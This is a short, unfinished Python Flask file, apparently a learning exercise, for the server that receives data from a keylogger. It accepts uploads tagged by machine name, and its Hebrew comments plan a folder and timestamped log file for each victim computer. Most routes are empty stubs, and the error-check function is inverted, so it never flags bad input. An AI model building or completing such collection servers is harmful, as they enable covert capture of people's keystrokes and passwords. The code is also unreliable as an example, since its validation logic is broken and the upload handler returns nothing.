import json
import os
from flask import Flask,jsonify,request
import time

app = Flask(__name__)

@app.route('/')
def home():
    return "keylogger is running"

@app.route("/api/upload",methods=['POST'])
def upload():
    data = request.get_json()

    #ניהול שגיאות
    if error_manager(data):
        return jsonify({"error" : "Invalid upload"})

    #קבלת הנתונים המתאימים
    folder_name = data["mac_name"]
    text = data["data"]

    #לעשות על הנתונים פרוסס

    #יצירת תיקיה למחשב הנתון

    #יצירת נתיב ליצירת קובץ

    #שליחת הנתונים הרלוונטים לקובץ

def error_manager(data:dict) -> bool:
    if not data:
        return False
    if "mac_name" not in data:
        return False


def open_new_folder(folder_name):
    if not os.path.exists(folder_name):
        os.mkdir(folder_name)

def generate_json_file():
    return "log_" + time.strftime("%Y-%m-%d_%H:%M:%S") + ".json"

def save_data_in_DB(data):
    pass

def get_data_from_DB():
    pass

@app.route("/api/data",methods=['GET'])
def get_data():
    pass

if __name__ == '__main__':
    app.run(debug=True,port=5000)

